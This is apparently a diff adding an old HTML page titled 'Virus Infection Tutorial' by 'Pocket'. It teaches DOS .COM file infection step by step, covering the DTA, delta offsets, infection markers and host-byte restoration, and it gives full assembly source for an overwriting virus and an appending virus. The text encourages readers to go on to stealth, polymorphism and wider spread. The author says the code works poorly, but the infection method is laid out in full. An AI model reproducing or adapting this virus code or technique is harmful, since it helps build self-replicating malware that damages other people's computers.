@@ -1,0 +1,685 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Virus Infection Tutorial 0.5 (Pocket)</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>The Not-Very-Flashy-Yet-Informative-And-Largely-Typoed<BR>
+Virus infection tutorial by Pocket...<BR>
+v0.5 finally final, I hope......</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>        No hot-air-fulla-shit loud mouthing here, just answers.
+ Someone is always 10 times better than you, or atleast just as good,
+ so those k-rad/elite guys can kiss my ass.
+ Point of this tutorial is to show the reader how and why viruses
+ spread.  What the reader intends to do with this information is entirely
+ based on his decisions.  Any damages or wrongful doings here are not
+ my problem.  I'm simply delivering information, not shooting children.
+-
+ Distributing this tute:
+        Be my guest and send it around, I don't mind.  You do not
+        have the authors permission to change the content of this
+        tutorial.
+
+ About the source code in this tute:
+        The virus this file contains is not meant to be cut&amp;pasted
+        and compiled, since...  It doesn't work very well!  And I
+        did this on purpose, considering all of those hacked viruses
+        of the past.
+-
+----------------------------------------------------------------------------
+
+<B>#1 What do these lil' buggers do?:
+
+</B>        The Idea behind a computer virus is the same as the workings
+ of a Biological virus.  The virus takes advantage of the hosts cells
+ in order to live and spread.  Biological viruses usually kill the host
+ in the end, MY computer viruses DO NOT.  I do NOT support destructive
+ code.  It's not because I like people..  It's not because I don't wanna
+ hurt anyone..  It's because the virus needs a chance to spread!  Not a one
+ shot wonder that ends up in McAfee 2 months before it's activation date.
+
+<B>#2 Ok, so what's the &quot;guts&quot; of a computer virus?
+
+</B>        The workings of a computer virus goes as follows:
+
+        Step 1: Find a &quot;host&quot;.  Generally, *.com or *.exe's, though
+                many viruses infect other files, and the ocassional
+                BootSector.
+
+            #2: Check this file for infection criteria.  This includes
+                making sure the file has read/write permissions, making
+                sure it may not be part of an anti-virus, and making
+                sure that adding our virus to it won't affect the
+                way DOS (or other OS) runs it.
+
+            #3: Open the file and (maybe) return to step 2.
+                If there is an error, return to step 1.
+
+            #4: Write our code to it.
+
+            #5: Close it up and send it on it's merry little way.
+
+<B>#3 I understand the logic behind that, but how do you actually do it?!
+
+</B>        Generally, most viruses are written in assembly.
+    Assembly language is alot more powerful and compact than alot
+    of languages, but C++ is a decent way to START!  I'll basically
+    do most of this tutorial in Assembly..
+
+        There's 2 kinds of viruses we can write once we understand
+    the basic theory and a few assembler commands....  Overwriting
+    and Appending.......  Overwriting viruses DESTROY the host
+    program, leaving only *maybe* a remnant of the original program.
+    This is bad, because it can be noticed VERY VERY easily!
+    Appending viruses, on the other hand, MODIFY the host, and then
+    execute it properly.  No one notices a thing when their files
+    work fine!
+
+        Basic idea for an overwriting virus:
+                Find the first file... (.com files are easily overwritten)
+                Open the file...
+                Check for infection...
+                Write our code OVER the hosts code..
+                Close HOST...
+
+        Basic idea for an appending virus:
+                Jump to our code in current file...
+                Move original bytes of CURRENT file back into place...
+                Find first file...
+                Open file...
+                Check file for previous infection...
+                If no infection, write body of virus to the END of file...
+                Save ORIGINAL bytes of host...
+                Write instructions to jump to our code at beginning of new host...
+                Close file...
+                Jump to hosts bytes and finish running the CURRENT program...
+
+<B>#4 Alright, I've been avoiding this, but bring on the Technical shit!
+
+</B>        A few technical things you'll need to know....
+        (Note: I'll assume you're learning how to infect .com files,)
+        (and I will only include information here concerning them.  )
+        (Infecting .com files is simple, and it's the easiest way to)
+        (begin because of that.  The reason .com files are so easy  )
+        (to infect is because they are read straight into memory,   )
+        (right from the disk.  Exe's and other files contain headers)
+        (or other information needed for execution.                 )
+
+        General information on .com files:
+                Like stated before in the note, .com files are read
+                straight from disk and executed.  A PSP(Program Segment
+                Prefix) is built from offset 0h to offset FFh of the
+                memory allocated for the program, and the actual code
+                is read into and executed from 100h down.  The PSP
+                is not saved to disk, it is simply a temporary space
+                for the stack, DTA, and other things you need not
+                worry about right at this moment.  Again, the code
+                that is executed starts and stops in the .com file,
+                a temporary place to hold data is placed BEFORE
+                the actual code and it takes up FFh bytes.  The .com
+                file is read from disk and placed at offset 100h,
+                where it begins execution.  .exe's and other files
+                contain headers and other information, which are read
+                into memory and are saved to disk.  These headers
+                include the stack and other information, like where
+                the file actually begins execution.  This makes infecting
+                them trickier (to beginners, anyway) than infecting
+                a .com file.  Infecting a .com file simply means
+                altering it's code, infecting .exe's and other files
+                involve altering it's header AND it's code.
+
+        Find_First File Function and the DTA:  (Function 4eh, Int 21h)
+                This will find the FIRST file in the
+                CURRENT directory that matches the data at the offset
+                in the DX register...  It then moves this files
+                information into the DTA (Disk Transfer Area).
+                This is an area in the PSP of .com files.  The DTA is
+                located at offset 80h of the com file by default.
+                However, the DTA can be relocated by DOS INT 21h function 1ah.
+               
+        (!! NOTE:  Offset 80h is ALSO the beginning of the command tail!)
+        ( If we are writing an appending virus, calling this function   )
+        ( BEFORE relocating the DTA is NOT acceptable!  The command tail)
+        ( of the host program will be OVERWRITTEN. I.E. Format.com /s A:)
+        ( The &quot;/s A:&quot; would be overwritten with garbage, thus making    )
+        ( format.com suspicious AND malfunctioning!                     )
+
+
+        Data found in the DTA:
+                Assuming that a file is found, this data is moved to the
+                DTA.  Offsets in this table are the offsets in the DTA,
+                NOT the .com file!
+
+            Location and what it's there for:
+              0h 21 duplicate 0's -  Reserved for DOS purposes.
+              15h db 00 - File's attributes. (Readonly, archive, etc.)
+              16h dw 0000 - File's time attributes. (Time last modified)
+              18h dw 0000 - File's data attributes. (Date last modified)
+              1ah dd 00000000 - File's size.
+              1eh db 13 dup 0's - Asciiz of FileName.
+
+        To access this information, we will need to know what the offset
+        of the DTA is (80h in .com files unless moved as stated earlier)
+        Let's say we haven't moved it, and we got a file up there.
+        To get the file's name into the AX register, we'd do this:
+                mov ax,[80h+1eh]
+        80h being the offset of the START of the DTA, 1eh being the offset
+        of the file's name in asciiz.  9eh would be the offset considering
+        the DTA starts at 80h, and the asciiz of filename start 1eh bytes
+        from the beginning of the DTA.
+
+        Moving the DTA:
+                As I stated earlier, the DTA will need to be moved from
+                80h to preserve the hosts files functions.  We'd do this by
+                defining 42 duplicate bytes for it's use, and move it there.
+                        mov ah,1ah
+                        mov dx,offset newdta
+                        int 21h
+                        newdta db 42 dup (0)
+                To get information out of this new DTA, we'd do this:
+                        mov ax,[newdta+1eh]
+                And finally, we'd want to move the DTA back after we're done,
+                or the host will NOT function correctly and be suspicious:
+                        mov ah,1ah
+                        mov dx,80h
+                        int 21h
+
+        The DTA, put simply, is just a place where temporary data about
+        files is located well..  temporarily.  :)
+
+
+        Notes on Binary:
+                If you know how this works, skip it.  Alot of people
+                don't, though.
+            A binary number looks like this: 0000b.
+            Binary is a Base-2 number system.
+            Base-2 means there are 2 numbers. 0 or 1.  0 represents
+            that this place has no value.  1 represents that this
+            place has a value.
+            0001 = 1, 0010 = 2, 0011 = 3.  Each place is equal to twice
+            the previous value.  The bit at the first position stands for
+            1, the bit at the second position stands for 2, the bit at the
+            3rd position stands for 4, etc.
+
+        Notes on Hexidecimal:
+                If you know how this works, skip it.  Alot of people
+                don't, though.
+            A hex number looks like this: 0f6h
+            Hexidecimal is a base 16 number system.
+            It goes in order like this: 0 1 2 3 4 5 6 7 8 9 A B C D E F 10
+            10 in Hex = 16 in Decimal.  Play around with this in your head,
+            you'll need it.
+
+        Notes on sizes:
+                If you know how this works, skip it.  Alot of people
+                don't, though.
+            Data can be represented by bits, nibbles, words, and bytes.
+            Look these up for yourself, as this should be elementary
+            to an assembly coder.  The ones we will mostly be using
+            are: Bit, Byte, Word, and DoubleWord.  A BIT is the basic
+            &quot;block&quot; of information, it can either be a 1 or a 0, and
+            only a 1 or a 0.  A BYTE is 8 bits, and is represented in
+            2 hex numbers.  02h, 0ffh, 0fh, etc.  A word is 2 bytes,
+            i.e. 0fffh, 0234h, 2234h, 0f234h, etc.  A DWORD (double
+            word) is 2 words put together.  Kinda obvious what it is
+            and how it is represented, eh?
+
+<B>#5 Ouch, brain hurt.....
+
+</B>        You'll get used to it, only things you need to memorize are the
+        number systems, sizes of data, and your Assembly operands!
+            Things I recommend learning:
+                 Of course I recommend assembly.
+                 Learn about &quot;polymorphism&quot;, &quot;stealth&quot;, and encryption.
+                 Learn terminate-and-stay resident functions.
+                 Learn about segments and offsets.  In detail!
+                 Learn how to optimize your code for speed and compact.
+                 Learn tunneling, the best docs I've seen so far are by
+                    
+<B>#6 Ok, I've been waiting long enough, show me some code!
+
+</B>        Alright, first I'll show some code of an overwriting virus,
+        although these are NOT what you want to sit and write forever.
+        This tute is supposed to start easy and by the time it ends
+        you should know more than when you started.  I'd like for
+        all of you to go from this to your own appending viruses,
+        then maybe try encryption, then TSRs, then EXE infections, then
+        Polymorph, then bootsectors, then Multipartite, etc etc etc...
+
+        I'll assume you're using Tasm 2.0 or Greater, considering
+        I'm using Tasm 5.0....
+
+;------------------------Start of Source----------------------
+;        OverWriter by Pocket, for this Tutorial
+;-------------------------------------------------------------
+        overwriter segment
+                assume cs:overwriter
+                org 100h                ;Beginning of execution, to
+                                        ;make room for the PSP, as
+                                        ;explained earlier.
+        start:
+                jmp real_start
+                db      'G'             ;Marker byte, explained later.
+        real_start:
+                mov ah,4eh              ;Find the first file...
+                mov dx,offset fmask     ;Matching fmask...
+                int 21h
+                jmp open
+
+        find_next:
+                mov ah,4fh              ;Find the next file matching
+                int 21h                 ;Previous search.
+                jc exit
+
+        open:
+                mov ah,3dh              ;Open file...
+                mov al,02h              ;Read and write mode...
+                mov dx,09eh             ;9eh = Asciiz of file name in DTA.
+                int 21h
+
+                xchg ax,bx              ;Open file moves file_handle to ax,
+                                        ;However, we need it in bx.
+                mov ah,3fh              ;Infection check, so we
+                mov cx,4h               ;Don't keep overwriting the same file
+                mov dx,offset temp_buff
+                int 21h
+
+                cmp byte ptr [offset temp_buff+3],'G'  ;Infection check.
+                je find_next                  ;If infected, find next.
+
+                mov ah,40h              ;Write to file...
+                mov dx,offset start     ;Where to copy from...
+                mov cx,(offset vend - offset start) ;How many bytes to write.
+                int 21h
+
+                mov ah,3eh              ;Close and save file...
+                int 21h
+
+        exit:
+                mov ah,4ch              ;Terminate and return to DOS.
+                int 21h
+fmask   db      '*.com'
+vend    db      0
+overwriter      ends
+                end start
+;-----------------------End of Source------------------------------------
+
+        Basically, this virus finds the first file in the directory,
+        opens that file, writes itself over the information in
+        that file, closes and saves it, then exits to DOS.
+        
+        Ok, this virus is pathetic.  Print it out and laugh at it, but
+        it does what it does and that's replicate.  If you don't
+        understand the basic workings of this virus, go read more
+        samples that ARE NOT viruses, brush up on Asm opcodes, and
+        try again.  DO NOT proceed forward if you can't understand
+        it!
+
+<B>#7 Psst, Pocket.  This tute is making you look schizophrenic.
+
+</B>        Bah, shaddup. If it educates someone, I'm allowed to look stupid.
+
+<B>#8 Ok, I understand the pathetic excuse of a virus that was included in #6.
+
+</B>        Alright, good.  The virus in #6 is just about the simplest you can
+        get.  In fact, It will probably just sit there and overwrite
+        ITSELF repeatedly....  But it illustrates overwriting viruses.
+
+        Now, the next type of virus I'll show you is an Appending virus.
+        This needs a little bit of explaing before I show it to you.....
+
+        This type of virus NEEDS to maintain the hosts instructions that
+        it overwrites.  Unlike an overwriting virus, an appending virus
+        is NOT executed from 100h, so we'll need to find out where in
+        the host we are executing from.  The displacement is called
+        the 'delta offset', explained in detail shortly.
+
+        Notes for appending:
+                As stated, we'll need to save any bytes we modify
+                in the file and restore them when we're done.  We will
+                also need to move the DTA so the command tail is not
+                overwritten. 
+
+                Also, we'll need to read and save the original bytes
+                of the .com we're infecting, so it executes correctly
+                later.
+
+                A jump to our code at offset 100h is mandatory, too.
+
+                The MOST important thing about an appending virus is
+                what's called the &quot;delta offset&quot;..  This is just the
+                number of bytes our code is displaced by.  Without this,
+                our virus will just be a hunk of code that malfunctions
+                aimlessly.  The method we'll (maybe the easiest to 
+                understand..  I hope. )use starts with a CALL, the a POP BP,
+                and then we'll subtract where the offsets SHOULD be
+                by BP...  First thing you wanna know is, why is this
+                magic delta offset number appearing in BP?  Well, the
+                truth is the number isn't magic and you don't always
+                have to use BP to store it...  First you gotta know
+                how CALL works....  When you CALL something, it means
+                you want to run the routine and then return to where you
+                were before.  CALL needs to keep track of where you were
+                in order to return, right?  Well, it does this by PUSH'ing
+                the offset of the NEXT instruction onto the stack.  So you
+                POP it into BP and then subtract it from where the offsets
+                SHOULD BE...  Kinda hard to understand to some people, so
+                make a mental picture of some stairs...  Picture some
+                candy on stair 7, and you're on stair 1.  Imagine someone
+                picks you up and puts you on stair 3.  Now, from stair 1
+                you had to walk 7-1 stairs = 6.  If you walk 6 stairs
+                after someone put you on stair 3, you'd pass the candy!
+                But, if you just subtract your current step from the
+                steps you would've had to cross earlier, you'd get
+                the delta offset..( stair 3 - previous distance(6)) = 3.
+                3 more stairs and you'll get the candy.  Understand?
+                The delta offset is basically just how you keep track
+                of the new offsets of the code, by adding where the
+                code was at compile time and how many bytes it is displaced
+                by.  The term &quot;delta offset&quot; actually means, &quot;change of
+                offset&quot;.  The term 'delta' comes from the greek alphabet
+                and is commonly used to represent a &quot;change of&quot; in
+                mathetmatics.
+
+                A way to identify for previous infection is always good,
+                consideing we don't just want to repeatedly enlarge
+                one file aimlessly on and on and on and on and on and
+                on and on and on and on.
+
+<B>#9 Ok, I can understand that, where's the source for it?
+</B>      
+      There's enough examples on IRC and the 'net of appending viruses...
+      So this is rather redundant....
+      BUT...
+      I will show you some important routines and how the entire
+      virus works.  And like the overwriting virus, this one will
+      be just as stupid...
+
+  Appending Viruses 101:
+        And appending virus typically infects files by appending
+      their code to the end of the file, and writing a jmp instruction
+      over the first few bytes.  The jmp instruction transfers
+      control from the original file to the virus.  After control
+      is transferred, we'll need to find the Delta offset....
+      Universal code for this is:
+
+        call next
+      next:
+        pop bp
+        sub bp,offset next
+
+      This will give you the displacement in the BP register...
+      Once we've gotten that, we need to use it in our code....
+
+      Example of no delta offset:
+         mov ah,09h          ;This will write the string in 'msg' to screen.
+         mov dx,offset msg
+         int 21h
+      Example of using the delta offset:
+         mov ah,09h          ;This does the same thing, but with the delta offset code.
+         lea dx,[offset msg + bp]
+         int 21h
+
+      The jmp instruction:
+        Our virus needs to transfer control from the host program to us.
+        This is done by overwriting the first few bytes with a jmp to our
+        code. (The bytes will be patched back in later).  The jmp to our
+        code will be the length of the host BEFORE infection, since
+        we're writing our code to the END of the file, and executing
+        from there.
+
+        There are a few different ways to find the files original length,
+        and the length is not changed until the file is closed, so this
+        can go practically anywhere.
+
+      2 ways to get the original host size:
+        You can get the hosts size by using the DTA, or you can
+        get it after calling function 4202h, Int 21h (lseek eof).  Look
+        this up for yourself..  :)
+
+      Patching the host to working order:
+        We'll need to read the first couple bytes before we infect the
+        file so the hosts aren't suspicious.  After infection, the
+        host should run in this manner:
+                    Jmp instruction will transfer control to virus.
+                    Virus will infect next file, or any other virussy thing.
+                    Virus will restore original bytes to beginning.
+                    Virus will return control to host.
+                    Host will execute.
+
+        Before infecting the file, you should use function 3fh, Int 21h
+        to read the original byte and save them somewhere in the
+        virus.  After the virus finished running, the bytes need to be
+        restored and executed.  Movs* operands can be used to move
+        these back to their proper place.  Movs* (movsw, movsb, etc)
+        read what's addressed by ds:si and place it in the area addressed
+        by es:di, we're only moving bytes inside of the .com files
+        restricted memory, so ds and es need not be worried about.
+        Simply remember, si=source, di=destination.
+
+        Code for restoring bytes:
+             mov di,100h                 ;Address 100h...
+             lea si,[offset oldbytes+bp] ;Where the original bytes are.
+             mov cx,(# of bytes)         ;Cx = number of times to 'rep' an operand.
+             rep movsb                   ;movsb n number of times, where n=CX
+        Then a &quot;mov bp, 100h, jmp bp&quot; will suffice.
+        This should be enough to get you started, but let's brush up on
+        appending virus execution:
+             1. Jmp to virus code.
+             2. Find delta, move the DTA, etc.
+             3. Find a file to infect.
+             4. Check for infection criteria.
+             5. Open file, read the first few bytes, and save them.
+             6. Write jmp instruction to beginning of host, append virus
+                to end of new host.
+             7. Close newly infected file and execute current host as normal.
+
+        I highly recommend moving the oldbytes to their original place
+        BEFORE doing anything else, since this is easily forgotten
+        and if you do it after you infect the next file, you'll have
+        the wrong bytes in the wrong file, causing a crash..
+
+      Checking for infection:
+        There are a few ways to do this, I'll just explain the most
+        common 2.  Easiest way is to just put a marker of some sort
+        into the first few bytes.  Most optimized/best way is to just
+        check for infection using the JMP offset at the beginning of
+        a file.  The Marker Byte check is included in the source
+        for the overwriting virus.
+          The marker byte method is rather simple, you just read the
+          first 4 or more bytes of the file you want to infect, store
+          them, and write the mandatory 3 (jmp and offset to the virus),
+          and then a marker.  Then simply compare the fourth byte of
+          a potential host with your marker byte.  Another easy way,
+          yet it confuses some people, is reading the first 3 byte as
+          usual, and comparing the second and third bytes to what the
+          offset of a jmp to our virus WOULD BE, if the file is actually
+          infected.  Just remember that the offset of the jmp you write
+          to files IS the size of the original file BEFORE infection.
+          So simply get the number where the jmp offset WOULD BE- if
+          this file is actually infected, get the size of the current file,
+          subtract the current size from the virus size and then subtract
+          it by 3 (the size of the jmp instruction), and compare it to the
+          number where the jmp offset WOULD BE- if infected.
+          jmp_offset - current_size-vir_size-3 would equal 0 if the file
+          is actually infected. (Use a compare instruction, that is just
+          an example. :))
+<B>#11  Source, source, source, source....
+
+</B>        I got this weird feeling you want source..  So here it is.
+        Commented by kRaCkBaBy in his return to the virus scene..!
+        Welcome back, kB!
+
+;&lt;-----------------Beginning of Source-------------------------------------&gt;
+append  segment                          ;Comments bY: krackbaby
+        assume cs:append, ds:append      ;assume segments
+        org 100h                         ;all .COM files start at 100h
+start:
+        jmp next
+        db      'I''m a first gen!',0    ;A first generation virus
+                                         ;Is a virus without a host,
+                                         ;It usually infects itself
+                                         ;once, and then infects other
+                                         ;files.
+next:
+        call setup                       ;call to determine delta offset
+setup:
+        pop si                           ;get the current IP
+        sub si,offset setup              ;and subtract from original
+                                         ;The &quot;Delta Offset&quot;  :)
+
+        mov ah,1ah                       ;put 1ah function in ah
+        lea dx,[offset newdta+si]        ;to move the DTA  
+        int 21h                          ;so we don't corrupt it 
+
+        push si                          
+        lea si,[offset oldbytes+si]      ;Restore original bytes
+        mov di,100h                      ;to host at 100h
+        mov cx,3                         ;so it executes correctly. 
+        rep movsb                        ;Repeat as long as cx doesn't equal 0
+        pop si                           
+
+        mov ah,4eh                       ;put 4eh into ah for the find1st function
+        lea dx,[offset fmask+si]         ;with this file mask *.COM
+        mov cx,0007h                     ;this sets the attributes
+        int 21h                          ;to archive only
+        jc clean_up                      ;jump on carry to clean_up
+
+        jmp open                         ;jump to the open label
+
+find_another:
+        mov ah,3eh                       ;put 3eh in ah for the 
+        int 21h                          ;close file function
+
+        mov ah,4fh                       ;put 4fh in ah for the
+        int 21h                          ;findnext function
+        jc clean_up                      ;jump on carry to clean_up
+open:
+        mov ax,3d02h                     ;put 3d02 in ax to open read/write access
+        lea dx,[offset newdta+1eh+si]    ;using the dta we put here
+        int 21h                          ;(int21h) if you don't know what 
+                                         ;if you dont know what it is you need to read more  
+        xchg ax,bx                       ;when we open it the handle is  
+                                         ;returned in AX so we need it in bx
+no_no_check:                                         ;******?????
+        mov ah,3fh                                   ;move 3fh for read
+        lea dx,[offset oldbytes+si]                  ; 
+        mov cx,3                                     ;how many bytes to read
+        int 21h
+
+        mov ax,[offset newdta+1ah+si]      ;Get filesize from DTA.
+        sub ax,3                           ;Subtract by 3. (Size of jmp offset)
+        mov [offset newbytes+si+1],ax      ;Move the new jmp offset to it's buffer.
+        sub ax,(offset vend-offset next)   ;Subtract ax by virus size.
+        cmp word ptr [oldbytes+1+si],ax    ;check for infection.... 
+        je find_another                    ;Find another if this one is infected!    
+
+        mov ax,4202h                          ;4202h is the move file
+        cwd                                   ;pointer function
+        xor cx,cx                             ;put 0 in cx 
+        int 21h                               ;move to end of file
+                                              
+        mov ah,40h                            ;40h is the write funtion 
+        lea dx,[offset next+si]               ;where to start 
+        mov cx,(offset vend-offset next)      ;how many bytes to write
+        int 21h
+
+        mov ax,4200h                          ;4200h is the move file
+        cwd                                   ;pointer function
+        xor cx,cx                             ;put 0 in cx 
+        int 21h                               ;move to beginning of file 
+
+        mov ah,40h                            ;write to file function
+        lea dx,[offset newbytes+si]           ;bytes to write
+        mov cx,3                              ;how many bytes to write
+        int 21h
+
+clean_up:
+        mov ah,3eh           ;close file function
+        int 21h                                 
+
+        mov ah,1ah           ;return the DTA to its                  
+        mov dx,80h           ;proper place
+        int 21h
+                              
+        mov si,100h          ;put 100h where com files start :) 
+        jmp si               ;jump to host control 
+fmask     db &quot;*.com&quot;,0       ;file mask 
+newbytes db 0e9h,00h,00h     ;place to store the jump instruction
+oldbytes db 0cdh,20h,00h     ;place to store the original bytes of host
+vend     db 0                ;Virus end marker.
+newdta  db 42 dup (?)        ;buffer to store DTA
+append  ends
+        end start
+
+<B>#12 It can't be the end!  I want more!
+
+</B>        Too bad..  :)
+          This should be enough information to get you on your way
+          to writing and understand file viruses better.  You may
+          be able to write one now..  Try it!  If you don't succeed,
+          ask for help or try reading this again.  Good luck on your
+          new career, be it VXer or AVer.
+
+----------------------------------------------------------------------------
+----------------------------------------------------------------------------
+     Welp, this is the end..  I hope I fed you enough tecnical facts
+     about how the DTA, Delta Offset, and viruses in general work..
+     I recommend finding a copy of the &quot;HelpPC&quot; database, if you're
+     just starting out in assembler, and if not it's still a bit of
+     help in other cases.
+
+     Have a nice day, pay at the 2nd window, and don't infect yourself.
+----------------------------------------------------------------------------
+About the Author:
+        Pocket hasn't released any viruses into the wild (*purposely*),
+     and has never been infected unless he did it on purpose..  :)
+     Pocket doesn't really know why he's talking in 3rd person right now,
+     but he's gonna stop.
+        As mentioned before, I do NOT like destructive payloads, because
+     it doesn't allow the virus to spread as far as it COULD without
+     the payload...  Just think about that...
+
+Greets:
+        The first version of this tute got kinda popular!  So it's time
+        to add one of those greets sections.
+
+kRaCkBaBy- Thanks for commenting, welcome back!
+Lych-      Wanker...  Thanks for proof-reading this shit!
+#virus on Undernet- Get the server up already!
+rebyc-     Erm, visiting just to say hi to little ol' me?  How tweet...
+LT-        Hey, get the mag out, I've written almost 2 of these already!
+Isomer-    Start saying 'erm'.
+Yosha-     You just need to be in the greets.  Start saying 'erm', too.
+Random-    Off the dope, man, yer getting stupid...  :P
+WarBlade-  Quit teasing about how you live near me, where the fuck do you live?!
+FlmWombat &amp; Marc- You guys make #virus what it is today.  Mostly.. :)
+X and all the bots on IRC:  Love talking to you, don't leave, ok?
+Prometh-   Spiff up the page man, thanks for distroing this piece o' shit!
+Ratboy-    Your tutes were just the shit.. hehe.
+RockSteady of Nuke- Your tutes were just shit...
+<A HREF="groups2.htm#VLAD">Vlad</A>-      Don't lose it now, yer not done yet!
+Methyl-    The first person to actually proofread this piece of shit..
+           Thanks alot.. :)
+
+All those other people I was too lazy to mention- Hi... and stuff.
+
+And last but not least, my (ex)girlfriend Kim, who has shown me how to be happy
+again, without worrying about what other people think.  Readers should pray
+to any God they believe in that we don't have kids, Mini-Pockets!  Scary!
+------------------------------------------------------------------------Out!-</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
